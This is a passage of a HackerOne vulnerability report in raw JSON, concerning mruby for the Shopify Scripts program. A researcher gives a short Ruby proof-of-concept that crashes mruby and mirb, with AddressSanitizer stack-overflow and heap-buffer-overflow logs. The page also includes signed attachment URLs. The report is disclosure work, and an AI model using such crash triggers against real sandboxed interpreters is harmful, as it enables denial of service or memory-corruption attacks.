P%2Bzn9VyHRQJZnA1hWcpkteF706gKj%2FXnieX9VW%2FOBOoEUExU1kfEmA0ZpoQRXSm8ma7vzsQoYhwoevAvKutaOvkhM8WM71tgT1%2FjC27FmA%2F%2FsDsAjQs2Rv9IujFElYACO0n6OSheOZw%3D%3D\u0026X-Amz-Signature=4939c1417acb5583ef93bb917027ddf258fc2f5ac524bc0efb403773a64b2587","file_size":89,"type":"text/x-c++"},{"id":145830,"file_name":"sandbox.log","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/145/830/82d6484ab84cbc4381170e073b84e51b0a772182/sandbox.log?response-content-disposition=attachment%3B%20filename%3D%22sandbox.log%22%3B%20filename%2A%3DUTF-8%27%27sandbox.log\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVN4C5GIR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045018Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICjdrX7ABZ%2BvfX76vY4hAT36HAFa7ABTRFnFNWlME3RsAiA6spUqHGGbpGIJMpDYYPRLrN21uLj3JvPgDLV04KLXWCq0AwhSEAEaDDAxMzYxOTI3NDg0OSIM%2BwbYtZgzO0HRNuilKpED0QRzghA3dQ82LDNvNHg%2F%2Bapjkbzzquj0OQyaslf6lhZ6ae5aaEALaU1htc90%2FTkEnCjK7YAB%2BOOqYauHnXFwgnicH8P2qB1b6qq8ByPdiyv%2F6FeKLaeKEKd1ked0wxhxGILfvv9geWvP9kPkCkrnpW%2Bk3I2nWFhXQ59oSwcUQzXUMoZ0agtptlqAo0vIB0BQ8w3QdM1eyZALy%2Fa2aEoAk0NEEkFhGgVq6y7NSlne0HYNYsnTubU1gtBiWgKFN75WWxAKzP41DZr9biaTv2LpKz%2BS54%2B0D7gM01Pv9DWNFSxduldCjFNWMHaz53TpINKZivByzZ%2FZritkdAHNoYR8NUHdDo4fG9KADtaMgItKYoCYS9dQ3VQKUnEB%2FG5XIqiEWJNuiVPw9Xo1zZJ7ItciKJ%2F2lZOYbSY5IWLtOLK3LAXfBln%2BqWM6KN%2BYSgAqj80OMMoKJozuCJRCLPgT%2BsuXVxgkfPMjWm0msUwRdOuNqAG3PPIFx7Qi20ur1fS33s63LIR24RY3pe1aeEm14DkixQAwqvyp%2FwU67AFUTZKxgkosuC9%2FFnLTDWAcFKkGbWeTSyQlX9WvARJtmEGSKKE3O3RCz4o1fvK2y8cIWG4ZDqIQnnY30DkA5lvQ1S96196eUcIlxUE3IU6WzlYzirsAJvCXzxdcKxl0gn59sA3vLFJkUTgoas7IMyJTtRG6%2B0%2BVBuYKCHqJR1eTwSQxZvSP%2Bzn9VyHRQJZnA1hWcpkteF706gKj%2FXnieX9VW%2FOBOoEUExU1kfEmA0ZpoQRXSm8ma7vzsQoYhwoevAvKutaOvkhM8WM71tgT1%2FjC27FmA%2F%2FsDsAjQs2Rv9IujFElYACO0n6OSheOZw%3D%3D\u0026X-Amz-Signature=b015d05eaf052903ae858c1fd4b763764df90d75c2fcbcd937fdddfbd4aa7726","file_size":34456,"type":"text/plain"}],"allow_singular_disclosure_at":"2017-03-01T21:34:15.190Z","allow_singular_disclosure_after":-120813363.02072543,"singular_disclosure_allowed":true,"vote_count":3,"voters":["eveeez","apapedulimu","spetr0x"],"severity":{"rating":"low","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1379424,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nDue to the holiday period and the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!","markdown_message":"\u003cp\u003eThank you for reporting this bug! This is an automated response to let you know that we\u0026#39;ve received your issue, and we\u0026#39;ll process it as soon as possible.\u003c/p\u003e\n\n\u003cp\u003eDue to the holiday period and the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!\u003c/p\u003e\n","automated_response":true,"created_at":"2016-12-21T14:23:30.739Z","updated_at":"2016-12-21T14:23:30.739Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1380468,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I worked on this subject.\n\nStack Overflow - PoC - 1\n-------------------------\nThe following code triggers the bug (attached as mrb_check_intern_str_stackoverflow.rb):\n\n\tdef to_str\n\t?s.replace($\")end\n\t$s=?\"\n\tclass Test00espondTo end\n\tTest00espondTo.respond_to?(0)\n\t\nmirb with clang\n-------------------------\nAttached as mirb-stack-overflow.log\n\n\tx@x:~/Desktop/research/clang/mruby/bin$ ./mirb mrb_check_intern_str_stackoverflow.rb \n\tmirb - Embeddable Interactive Ruby Shell\n\n\t =\u003e :to_str\n\t =\u003e \"\\\"\"\n\t =\u003e nil\n\tASAN:DEADLYSIGNAL\n\t=================================================================\n\t==17199==ERROR: AddressSanitizer: stack-overflow on address 0x7fff2529de58 (pc 0x0000004aebf0 bp 0x7fff2529e6b0 sp 0x7fff2529de30 T0)\n\t\t#0 0x4aebef  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x4aebef)\n\t\t#1 0x51211e  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x51211e)\n\t\t#2 0x501d5b  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x501d5b)\n\t\t...\n\t\t...\n\t\t...\n\t\t#248 0x5cad42  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x5cad42)\n\t\t#249 0x5cbd01  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x5cbd01)\n\t\t#250 0x62bb09  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x62bb09)\n\t\t#251 0x61028e  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x61028e)\n\n\tSUMMARY: AddressSanitizer: stack-overflow (/home/x/Desktop/research/clang/mruby/bin/mirb+0x4aebef) \n\t==17199==ABORTING\n\nmruby with clang\n-------------------------\nAttached as mruby-stack-overflow.log\n\n\tx@x:~/Desktop/research/clang/mruby/bin$ ./mruby mrb_check_intern_str_stackoverflow.rb \n\tASAN:DEADLYSIGNAL\n\t=================================================================\n\t==16066==ERROR: AddressSanitizer: stack-overflow on address 0x7fff8ed48600 (pc 0x0000005b3ed5 bp 0x7fff8ed4a370 sp 0x7fff8ed48600 T0)\n\t\t#0 0x5b3ed4  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x5b3ed4)\n\t\t#1 0x547ac8  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x547ac8)\n\t\t#2 0x65470c  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x65470c)\n\t\t...\n\t\t...\n\t\t...\n\t\t#247 0x6433f9  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x6433f9)\n\t\t#248 0x640c6c  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x640c6c)\n\t\t#249 0x56ff42  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x56ff42)\n\t\t#250 0x570f01  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x570f01)\n\t\t#251 0x5d9219  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x5d9219)\n\n\t\tSUMMARY: AddressSanitizer: stack-overflow (/home/x/Desktop/research/clang/mruby/bin/mruby+0x5b3ed4) \n\t\t==16066==ABORTING\n\t\t\nHeap Overflow - PoC - 2\n-------------------------\nThe following code triggers the bug (attached as mrb_check_intern_str_heap_buffer_overflow.rb):\n\n\tdef to_str\n\t?s.replace($\")end\n\t$s=?\"\n\tclass Test00espondTo end\n\tTest00espondTo.respond_to?(0)\n\nmruby with clang\n-------------------------\nAttached as mruby-heap-buffer-overflow.log\n\n\tx@x:~/Desktop/research/clang/mruby/bin$ ./mruby mrb_check_intern_str_heap_buffer_overflow.rb \n\t=================================================================\n\t==14545==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x62f000000000 at pc 0x00000051c81f bp 0x7fff5c43b610 sp 0x7fff5c43b608\n\tREAD of size 4 at 0x62f000000000 thread T0\n\t\t#0 0x51c81e  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x51c81e)\n\t\t#1 0x69997f  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x69997f)\n\t\t#2 0x65470c  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x65470c)\n\t\t#3 0x64b31b  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x64b31b)\n\t\t#4 0x6773e8  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x6773e8)\n\t\t#5 0x616529  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x616529)\n\t\t#6 0x6171c5  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x6171c5)\n\t\t#7 0x4f3af5  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x4f3af5)\n\t\t#8 0x7f629d32eec4  (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)\n\t\t#9 0x41a505  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x41a505)\n\n\t0x62f000000000 is located 1024 bytes to the left of 49200-byte region [0x62f000000400,0x62f00000c430)\n\tallocated by thread T0 here:\n\t\t#0 0x4c4c0d  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x4c4c0d)\n\t\t#1 0x5153f5  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x5153f5)\n\t\t#2 0x507fd6  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x507fd6)\n\t\t#3 0x508624  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x508624)\n\t\t#4 0x508f63  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x508f63)\n\t\t#5 0x508ffd  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x508ffd)\n\t\t#6 0x509529  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x509529)\n\t\t#7 0x509396  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x509396)\n\t\t#8 0x515274  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x515274)\n\t\t#9 0x51553c  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x51553c)\n\t\t#10 0x51550a  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x51550a)\n\t\t#11 0x4f29d3  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x4f29d3)\n\t\t#12 0x7f629d32eec4  (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)\n\n\tSUMMARY: AddressSanitizer: heap-buffer-overflow (/home/x/Desktop/research/clang/mruby/bin/mruby+0x51c81e) \n\tShadow bytes around the buggy address:\n\t  0x0c5e7fff7fb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n\t  0x0c5e7fff7fc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n\t  0x0c5e7fff7fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n\t  0x0c5e7fff7fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n\t  0x0c5e7fff7ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n\t=\u003e0x0c5e7fff8000:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n\t  0x0c5e7fff8010: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n\t  0x0c5e7fff8020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n\t  0x0c5e7fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n\t  0x0c5e7fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n\t  0x0c5e7fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n\tShadow byte legend (one shadow byte represents 8 application bytes):\n\t  Addressable:           00\n\t  Partially addressable: 01 02 03 04 05 06 07 \n\t  Heap left redzone:       fa\n\t  Heap right redzone:      fb\n\t  Freed heap region:       fd\n\t  Stack left redzone:      f1\n\t  Stack mid redzone:       f2\n\t  Stack right redzone:     f3\n\t  Stack partial redzone:   f4\n\t  Stack after return:      f5\n\t  Stack use after scope:   f8\n\t  Global redzone:          f9\n\t  Global init order:       f6\n\t  Poisoned by user:        f7\n\t  Container overflow:      fc\n\t  Array cookie:            ac\n\t  Intra object redzone:    bb\n\t  ASan internal:           fe\n\t  Left alloca redzone:     ca\n\t  Right alloca redzone:    cb\n\t==14545==ABORTING","markdown_message":"\u003cp\u003eI worked on this subject.\u003c/p\u003e\n\n\u003ch2 id=\"stack-overflow-poc-1\"\u003eStack Overflow - PoC - 1\u003c/h2\u003e\n\n\u003cp\u003eThe following code triggers the bug (attached as mrb_check_intern_str_stackoverflow.rb):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003edef to_str\n?s.replace($\u0026quot;)end\n$s=?\u0026quot;\nclass Test00espondTo end\nTest00espondTo.respond_to?(0)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"mirb-with-clang\"\u003emirb with clang\u003c/h2\u003e\n\n\u003cp\u003eAttached as mirb-stack-overflow.log\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ex@x:~/Desktop/research/clang/mruby/bin$ ./mirb mrb_check_intern_str_stackoverflow.rb \nmirb - Embeddable Interactive Ruby Shell\n\n =\u0026gt; :to_str\n =\u0026gt; \u0026quot;\\\u0026quot;\u0026quot;\n =\u0026gt; nil\nASAN:DEADLYSIGNAL\n=================================================================\n==17199==ERROR: AddressSanitizer: stack-overflow on address 0x7fff2529de58 (pc 0x0000004aebf0 bp 0x7fff2529e6b0 sp 0x7fff2529de30 T0)\n    #0 0x4aebef  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x4aebef)\n    #1 0x51211e  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x51211e)\n    #2 0x501d5b  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x501d5b)\n    ...\n    ...\n    ...\n    #248 0x5cad42  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x5cad42)\n    #249 0x5cbd01  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x5cbd01)\n    #250 0x62bb09  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x62bb09)\n    #251 0x61028e  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x61028e)\n\nSUMMARY: AddressSanitizer: stack-overflow (/home/x/Desktop/research/clang/mruby/bin/mirb+0x4aebef) \n==17199==ABORTING\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"mruby-with-clang\"\u003emruby with clang\u003c/h2\u003e\n\n\u003cp\u003eAttached as mruby-stack-overflow.log\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ex@x:~/Desktop/research/clang/mruby/bin$ ./mruby mrb_check_intern_str_stackoverflow.rb \nASAN:DEADLYSIGNAL\n=================================================================\n==16066==ERROR: AddressSanitizer: stack-overflow on address 0x7fff8ed48600 (pc 0x0000005b3ed5 bp 0x7fff8ed4a370 sp 0x7fff8ed48600 T0)\n    #0 0x5b3ed4  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x5b3ed4)\n    #1 0x547ac8  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x547ac8)\n    #2 0x65470c  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x65470c)\n    ...\n    ...\n    ...\n    #247 0x6433f9  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x6433f9)\n    #248 0x640c6c  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x640c6c)\n    #249 0x56ff42  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x56ff42)\n    #250 0x570f01  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x570f01)\n    #251 0x5d9219  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x5d9219)\n\n    SUMMARY: AddressSanitizer: stack-overflow (/home/x/Desktop/research/clang/mruby/bin/mruby+0x5b3ed4) \n    ==16066==ABORTING\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"heap-overflow-poc-2\"\u003eHeap Overflow - PoC - 2\u003c/h2\u003e\n\n\u003cp\u003eThe following code triggers the bug (attached as mrb_check_intern_str_heap_buffer_overflow.rb):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003edef to_str\n?s.replace($\u0026quot;)end\n$s=?\u0026quot;\nclass Test00espondTo end\nTest00espondTo.respond_to?(0)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"mruby-with-clang\"\u003emruby with clang\u003c/h2\u003e\n\n\u003cp\u003eAttached as mruby-heap-buffer-overflow.log\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ex@x:~/Desktop/research/clang/mruby/bin$ ./mruby mrb_check_intern_str_heap_buffer_overflow.rb \n=================================================================\n==14545==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x62f000000000 at pc 0x00000051c81f bp 0x7fff5c43b610 sp 0x7fff5c43b608\nREAD of size 4 at 0x62f000000000 thread T0\n    #0 0x51c81e  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x51c81e)\n    #1 0x69997f  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x69997f)\n    #2 0x65470c  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x65470c)\n    #3 0x64b31b  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x64b31b)\n    #4 0x6773e8  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x6773e8)\n    #5 0x616529  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x616529)\n    #6 0x6171c5  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x6171c5)\n    #7 0x4f3af5  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x4f3af5)\n    #8 0x7f629d32eec4  (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)\n    #9 0x41a505  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x41a505)\n\n0x62f000000000 is located 1024 bytes to the left of 49200-byte region [0x62f000000400,0x62f00000c430)\nallocated by thread T0 here:\n    #0 0x4c4c0d  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x4c4c0d)\n    #1 0x5153f5  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x5153f5)\n    #2 0x507fd6  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x507fd6)\n    #3 0x508624  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x508624)\n    #4 0x508f63  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x508f63)\n    #5 0x508ffd  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x508ffd)\n    #6 0x509529  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x509529)\n    #7 0x509396  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x509396)\n    #8 0x515274  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x515274)\n    #9 0x51553c  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x51553c)\n    #10 0x51550a  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x51550a)\n    #11 0x4f29d3  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x4f29d3)\n    #12 0x7f629d32eec4  (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)\n\nSUMMARY: AddressSanitizer: heap-buffer-overflow (/home/x/Desktop/research/clang/mruby/bin/mruby+0x51c81e) \nShadow bytes around the buggy address:\n  0x0c5e7fff7fb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c5e7fff7fc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c5e7fff7fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c5e7fff7fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c5e7fff7ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n=\u0026gt;0x0c5e7fff8000:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c5e7fff8010: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c5e7fff8020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c5e7fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c5e7fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c5e7fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07 \n  Heap left redzone:       fa\n  Heap right redzone:      fb\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack partial redzone:   f4\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n==14545==ABORTING\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2016-12-21T20:55:59.286Z","updated_at":"2016-12-21T20:55:59.286Z","actor":{"username":"ston3","cleared":false,"url":"/ston3","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":145932,"filename":"mruby-heap-overflow.log","type":"text/plain","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/145/932/89ae88af3d7c9b3bc9a352f99b3dc160d5884663/mruby-heap-overflow.log?response-content-disposition=attachment%3B%20filename%3D%22mruby-heap-overflow.log%22%3B%20filename%2A%3DUTF-8%27%27mruby-heap-overflow.log\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVN4C5GIR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045018Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICjdrX7ABZ%2BvfX76vY4hAT36HAFa7ABTRFnFNWlME3RsAiA6spUqHGGbpGIJMpDYYPRLrN21uLj3JvPgDLV04KLXWCq0AwhSEAEaDDAxMzYxOTI3NDg0OSIM%2BwbYtZgzO0HRNuilKpED0QRzghA3dQ82LDNvNHg%2F%2Bapjkbzzquj0OQyaslf6lhZ6ae5aaEALaU1htc90%2FTkEnCjK7YAB%2BOOqYauHnXFwgnicH8P2qB1b6qq8ByPdiyv%2F6FeKLaeKEKd1ked0wxhxGILfvv9geWvP9kPkCkrnpW%2Bk3I2nWFhXQ59oSwcUQzXUMoZ0agtptlqAo0vIB0BQ8w3QdM1eyZALy%2Fa2aEoAk0NEEkFhGgVq6y7NSlne0HYNYsnTubU1gtBiWgKFN75WWxAKzP41DZr9biaTv2LpKz%2BS54%2B0D7gM01Pv9DWNFSxduldCjFNWMHaz53TpINKZivByzZ%2FZritkdAHNoYR8NUHdDo4fG9KADtaMgItKYoCYS9dQ3VQKUnEB%2FG5XIqiEWJNuiVPw9Xo1zZJ7ItciKJ%2F2lZOYbSY5IWLtOLK3LAXfBln%2BqWM6KN%2BYSgAqj80OMMoKJozuCJRCLPgT%2BsuXVxgkfPMjWm0msUwRdOuNqAG3PPIFx7Qi20ur1fS33s63LIR24RY3pe1aeEm14DkixQAwqvyp%2FwU67AFUTZKxgkosuC9%2FFnLTDWAcFKkGbWeTSyQlX9WvARJtmEGSKKE3O3RCz4o1fvK2y8cIWG4ZDqIQnnY30DkA5lvQ1S96196eUcIlxUE3IU6WzlYzirsAJvCXzxdcKxl0gn59sA3vLFJkUTgoas7IMyJTtRG6%2B0%2BVBuYKCHqJR1eTwSQxZvSP%2Bzn9VyHRQJZnA1hWcpkteF706gKj%2FXnieX9VW%2FOBOoEUExU1kfEmA0ZpoQRXSm8ma7vzsQoYhwoevAvKutaOvkhM8WM71tgT1%2FjC27FmA%2F%2FsDsAjQs2Rv9IujFElYACO0n6OSheOZw%3D%3D\u0026X-Amz-Signature=da5f12be1e63a5b75e6347a462fea71f2cea924a3a82e72b6f622090e9a070e9"},{"id":145931,"filename":"mrb_check_intern_str_heap_buffer_overflow.rb","type":"text/plain","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/145/931/39da26b3715d9cbe98720b3489c115a97844f06e/mrb_check_intern_str_heap_buffer_overflow.rb?response-content-disposition=attachment%3B%20filename%3D%22mrb_check_intern_str_heap_buffer_overflow.rb%22%3B%20filename%2A%3DUTF-8%27%27mrb_check_intern_str_heap_buffer_overflow.rb\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVN4C5GIR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045018Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICjdrX7ABZ%2BvfX76vY4hAT36HAFa7ABTRFnFNWlME3RsAiA6spUqHGGbpGIJMpDYYPRLrN21uLj3JvPgDLV04KLXWCq0AwhSEAEaDDAxMzYxOTI3NDg0OSIM%2BwbYtZgzO0HRNuilKpED0QRzghA3dQ82LDNvNHg%2F%2Bapjkbzzquj0OQyaslf6lhZ6ae5aaEALaU1htc90%2FTkEnCjK7YAB%2BOOqYauHnXFwgnicH8P2qB1b6qq8ByPdiyv%2F6FeKLaeKEKd1ked0wxhxGILfvv9geWvP9kPkCkrnpW%2Bk3I2nWFhXQ59oSwcUQzXUMoZ0agtptlqAo0vIB0BQ8w3QdM1eyZALy%2Fa2aEoAk0NEEkFhGgVq6y7NSlne0HYNYsnTubU1gtBiWgKFN75WWxAKzP41DZr9biaTv2LpKz%2BS54%2B0D7gM01Pv9DWNFSxduldCjFNWMHaz53TpINKZivByzZ%2FZritkdAHNoYR8NUHdDo4fG9KADtaMgItKYoCYS9dQ3VQKUnEB%2FG5XIqiEWJNuiVPw9Xo1zZJ7ItciKJ%2F2lZOYbSY5IWLtOLK3LAXfBln%2BqWM6KN%2BYSgAqj80OMMoKJozuCJRCLPgT%2BsuXVxgkfPMjWm0msUwRdOuNqAG3PPIFx7Qi20ur1fS33s63LIR24RY3pe1aeEm14DkixQAwqvyp%2FwU67AFUTZKxgkosuC9%2FFnLTDWAcFKkGbWeTSyQlX9WvARJtmEGSKKE3O3RCz4o1fvK2y8cIWG4ZDqIQnnY30DkA5lvQ1S96196eUcIlxUE3IU6WzlYzirsAJvCXzxdcKxl0gn59sA3vLFJkUTgoas7IMyJTtRG6%2B0%2BVBuYKCHqJR1eTwSQxZvSP%2Bzn9VyHRQJZnA1hWcpkteF706gKj%2FXnieX9VW%2FOBOoEUExU1kfEmA0ZpoQRXSm8ma7vzsQoYhwoevAvKutaOvkhM8WM71tgT1%2FjC27FmA%2F%2FsDsAjQs2Rv9IujFElYACO0n6OSheOZw%3D%3D\u0026X-Amz-Signature=f2d51fb930c52cfbe85ee6fd030649faabd4944106c1063d54b3acb00f29c48f"},{"id":145930,"filename":"mruby-stack-overflow.log","type":"text/plain","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/145/930/dfcadf9f88802325937d919f4dccdae1fe892c4d/mruby-stack-overflow.log?response-content-disposition=attachment%3B%20filename%3D%22mruby-stack-overflow.log%22%3B%20filename%2A%3DUTF-8%27%27mruby-stack-overflow.log\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVN4C5GIR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045018Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICjdrX7ABZ%2BvfX76vY4hAT36HAFa7ABTRFnFNWlME3RsAiA6spUqHGGbpGIJMpDYYPRLrN21uLj3JvPgDLV04KLXWCq0AwhSEAEaDDAxMzYxOTI3NDg0OSIM%2BwbYtZgzO0HRNuilKpED0QRzghA3d